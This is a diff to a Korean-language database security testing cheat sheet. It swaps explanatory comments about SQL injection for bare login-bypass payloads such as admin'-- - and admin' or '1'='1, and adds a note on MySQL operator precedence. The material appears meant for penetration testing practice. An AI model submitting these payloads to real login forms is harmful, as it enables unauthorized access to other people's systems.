@@ -1,28 +1,18 @@
 # Database Services - 데이터베이스 보안 테스트 가이드
 ## 🔐 SQL Injection
+- mysql :  AND operator would be evaluated before the OR operator.
 ```sql
--- 기본 싱글 쿼트 주입
 admin'
-
--- 주석을 이용한 우회 (MySQL, MSSQL)
 admin'-- -
-
--- 세미콜론 + 주석 (다중 쿼리 환경)
 admin';-- -
-
--- 해시 주석 (MySQL)
 admin'#
+admin')-- -
 ```
-
-**작동 원리**:
 ```sql
--- 원본 쿼리 (예시)
-SELECT * FROM users WHERE username='[INPUT]' AND password='[PASSWORD]'
-
--- 'admin'-- -' 입력 시 실행되는 쿼리
-SELECT * FROM users WHERE username='admin'-- -' AND password='...'
--- AND password 부분이 주석 처리되어 비밀번호 검증 우회
+username : admin' or '1'='1
+password : password' or '1'='1
 ```
+
 ---
 
 ## 📊 MySQL
